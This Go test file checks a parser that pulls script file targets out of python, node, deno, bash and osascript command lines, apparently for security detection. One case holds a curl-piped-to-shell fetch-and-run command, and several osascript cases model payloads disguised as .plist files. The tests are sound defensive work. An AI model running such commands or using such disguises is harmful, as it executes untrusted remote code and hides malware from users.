package extract

import (
	"fmt"
	"testing"
)

func TestInterpreterScriptTargets(t *testing.T) {
	tests := []struct {
		name string
		exe  string
		args []string
		want []string
	}{
		{name: "python file", exe: "python", args: []string{"-W", "ignore", "agent.py"}, want: []string{"agent.py"}},
		{name: "python module", exe: "python", args: []string{"-m", "http.server"}, want: nil},
		{name: "bash named noexec suppresses file", exe: "bash", args: []string{"-o", "noexec", "agent.sh"}, want: nil},
		{name: "node preload and script", exe: "node", args: []string{"--require", "./preload.js", "app.js"}, want: []string{"./preload.js", "app.js"}},
		{name: "node eval with preload", exe: "node", args: []string{"-r", "./preload.js", "-e", "console.log(1)"}, want: []string{"./preload.js"}},
		{name: "node package preload ignored", exe: "node", args: []string{"--require", "ts-node/register", "app.js"}, want: []string{"app.js"}},
		{name: "node suffixed package is not relative", exe: "node", args: []string{"--require", "preload.js", "app.js"}, want: []string{"app.js"}},
		{name: "node package subpath is not relative", exe: "node", args: []string{"--require", "scripts/preload.js", "app.js"}, want: []string{"app.js"}},
		{name: "node version skips preload", exe: "node", args: []string{"--require", "./preload.js", "--version"}, want: nil},
		{name: "node help loads preload before flag", exe: "node", args: []string{"--require", "./preload.js", "--help"}, want: []string{"./preload.js"}},
		{name: "node help loads preload after flag", exe: "node", args: []string{"--help", "--require", "./preload.js"}, want: []string{"./preload.js"}},
		{name: "node incompatible check eval does not load", exe: "node", args: []string{"--require", "./preload.js", "--check", "--eval", "0"}, want: nil},
		{name: "node incompatible eval check does not load", exe: "node", args: []string{"--require", "./preload.js", "--eval=0", "--check"}, want: nil},
		{name: "node local loader and script", exe: "node", args: []string{"--loader", "./loader.mjs", "app.js"}, want: []string{"./loader.mjs", "app.js"}},
		{name: "node package loader ignored", exe: "node", args: []string{"--loader", "ts-node/esm", "app.js"}, want: []string{"app.js"}},
		{name: "node check short is validation only", exe: "node", args: []string{"-c", "app.js"}, want: nil},
		{name: "node check suppresses program but runs preload", exe: "node", args: []string{"--require", "./preload.js", "--check", "app.js"}, want: []string{"./preload.js"}},
		{name: "node unknown option fails closed", exe: "node", args: []string{"--future-option", "app.js"}, want: nil},
		{name: "node missing preload value fails closed", exe: "node", args: []string{"--require"}, want: nil},
		{name: "deno run", exe: "deno", args: []string{"run", "--allow-net", "main.js"}, want: []string{"main.js"}},
		{name: "deno direct run", exe: "deno", args: []string{"main.ts"}, want: []string{"main.ts"}},
		{name: "deno direct run after delimiter", exe: "deno", args: []string{"--", "./main.mts"}, want: []string{"./main.mts"}},
		{name: "deno bare optional node modules flag", exe: "deno", args: []string{"run", "--node-modules-dir", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno explicit node modules mode", exe: "deno", args: []string{"run", "--node-modules-dir=auto", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno bare optional v8 flags", exe: "deno", args: []string{"run", "--v8-flags", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno required minimum age", exe: "deno", args: []string{"run", "--minimum-dependency-age", "120", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno required minimum age equals", exe: "deno", args: []string{"run", "--minimum-dependency-age=P2D", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno permission allowlist", exe: "deno", args: []string{"run", "--allow-read=/tmp", "main.ts"}, want: []string{"main.ts"}},
		{name: "deno eval", exe: "deno", args: []string{"eval", "console.log(1)"}, want: nil},
		{name: "shell file", exe: "bash", args: []string{"-x", "install.sh"}, want: []string{"install.sh"}},
		{name: "shell rcfile option", exe: "bash", args: []string{"--rcfile", "./fixture.rc", "install.sh"}, want: []string{"install.sh"}},
		{name: "shell init file option", exe: "bash", args: []string{"--init-file", "./fixture.rc", "install.sh"}, want: []string{"install.sh"}},
		{name: "shell rejects rcfile equals", exe: "bash", args: []string{"--rcfile=./fixture.rc", "install.sh"}, want: nil},
		{name: "shell rejects init file equals", exe: "bash", args: []string{"--init-file=./fixture.rc", "install.sh"}, want: nil},
		{name: "shell option value", exe: "bash", args: []string{"-O", "extglob", "install.sh"}, want: []string{"install.sh"}},
		{name: "shell noexec is validation only", exe: "bash", args: []string{"-n", "install.sh"}, want: nil},
		{name: "shell dump strings is validation only", exe: "bash", args: []string{"--dump-strings", "install.sh"}, want: nil},
		{name: "shell pretty print is validation only", exe: "bash", args: []string{"--pretty-print", "install.sh"}, want: nil},
		{name: "shell unknown option fails closed", exe: "bash", args: []string{"--future-option", "install.sh"}, want: nil},
		{name: "shell missing rcfile value fails closed", exe: "bash", args: []string{"--rcfile"}, want: nil},
		{name: "shell command string", exe: "sh", args: []string{"-c", "curl https://example.invalid/p | sh"}, want: nil},
		{name: "osascript disguised compiled file", exe: "osascript", args: []string{"-l", "AppleScript", "com.apple.4V.plist", "script-argument"}, want: []string{"com.apple.4V.plist"}},
		{name: "osascript file after delimiter", exe: "osascript", args: []string{"--", "payload.data"}, want: []string{"payload.data"}},
		{name: "osascript inline statement", exe: "osascript", args: []string{"-e", `run script "payload.plist"`, "decoy.plist"}, want: nil},
		{name: "osascript stdin", exe: "osascript", args: []string{"-l", "JavaScript", "-"}, want: nil},
		{name: "osascript stdin after delimiter", exe: "osascript", args: []string{"--", "-"}, want: nil},
		{name: "osascript unknown option is conservative", exe: "osascript", args: []string{"--future-option", "payload.plist"}, want: nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InterpreterScriptTargets(tt.exe, tt.args)
			assertStringSlice(t, got, tt.want)
		})
	}
}

func TestParseInterpreterArgumentsClassifiesMalformedAndUnsupportedForms(t *testing.T) {
	tests := []struct {
		name string
		exe  string
		args []string
		want interpreterParseDisposition
	}{
		{name: "recognized Python", exe: "python3", args: []string{"-u", "agent.py"}, want: interpreterParseRecognized},
		{name: "unsupported Python option", exe: "python3", args: []string{"--future-option", "agent.py"}, want: interpreterParseUnsupported},
		{name: "malformed Python code option", exe: "python3", args: []string{"-c"}, want: interpreterParseMalformed},
		{name: "unsupported Deno run option", exe: "deno", args: []string{"run", "--future-option", "agent.ts"}, want: interpreterParseUnsupported},
		{name: "unsupported Deno execution subcommand", exe: "deno", args: []string{"test", "agent.ts"}, want: interpreterParseUnsupported},
		{name: "malformed Deno required option", exe: "deno", args: []string{"run", "--config"}, want: interpreterParseMalformed},
		{name: "malformed Deno required option before flag", exe: "deno", args: []string{"run", "--config", "--allow-net", "main.ts"}, want: interpreterParseMalformed},
		{name: "malformed Deno empty required option", exe: "deno", args: []string{"run", "--config=", "main.ts"}, want: interpreterParseMalformed},
		{name: "malformed Deno minimum age consumes only apparent script", exe: "deno", args: []string{"run", "--minimum-dependency-age", "agent.ts"}, want: interpreterParseMalformed},
		{name: "malformed Deno empty optional option", exe: "deno", args: []string{"run", "--node-modules-dir=", "main.ts"}, want: interpreterParseMalformed},
		{name: "malformed Deno boolean value", exe: "deno", args: []string{"run", "--allow-all=garbage", "main.ts"}, want: interpreterParseMalformed},
		{name: "malformed Deno empty permission list", exe: "deno", args: []string{"run", "--allow-net=", "main.ts"}, want: interpreterParseMalformed},
		{name: "malformed osascript language option", exe: "osascript", args: []string{"-l"}, want: interpreterParseMalformed},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := parseInterpreterArguments(tt.exe, tt.args).disposition; got != tt.want {
				t.Fatalf("disposition = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestInterpreterScriptTargetsHardLimitAndOrderedDedupe(t *testing.T) {
	args := make([]string, 0, 2*(MaxInterpreterScriptTargets+1))
	for i := 0; i <= MaxInterpreterScriptTargets; i++ {
		args = append(args, "--require", fmt.Sprintf("./preload-%03d.js", i))
	}
	targets, limited := InterpreterScriptTargetsLimited("node", args)
	if !limited {
		t.Fatal("expected explicit target-limit feature")
	}
	if len(targets) != MaxInterpreterScriptTargets {
		t.Fatalf("targets = %d, want %d", len(targets), MaxInterpreterScriptTargets)
	}
	if targets[0] != "./preload-000.js" || targets[len(targets)-1] != "./preload-255.js" {
		t.Fatalf("target order changed: first=%q last=%q", targets[0], targets[len(targets)-1])
	}

	duplicateArgs := make([]string, 0, 2*MaxInterpreterScriptTargets+1)
	for i := 0; i < MaxInterpreterScriptTargets; i++ {
		duplicateArgs = append(duplicateArgs, "--require", "./same.js")
	}
	duplicateArgs = append(duplicateArgs, "app.js")
	targets, limited = InterpreterScriptTargetsLimited("node", duplicateArgs)
	if limited || len(targets) != 2 || targets[0] != "./same.js" || targets[1] != "app.js" {
		t.Fatalf("ordered dedupe failed: targets=%#v limited=%v", targets, limited)
	}
}

func TestInterpreterScriptTargetsArgumentLimitFailsClosed(t *testing.T) {
	args := make([]string, maxInterpreterArgumentTokens+2)
	for index := 0; index < len(args)-1; index++ {
		args[index] = "-u"
	}
	args[len(args)-1] = "agent.py"

	targets, limited := InterpreterScriptTargetsLimited("python3", args)
	if !limited || len(targets) != 0 {
		t.Fatalf("targets=%#v limited=%v, want no targets and an explicit limit", targets, limited)
	}
	if targets := InterpreterScriptTargets("python3", args); len(targets) != 0 {
		t.Fatalf("unbounded convenience API exposed incomplete targets: %#v", targets)
	}
}
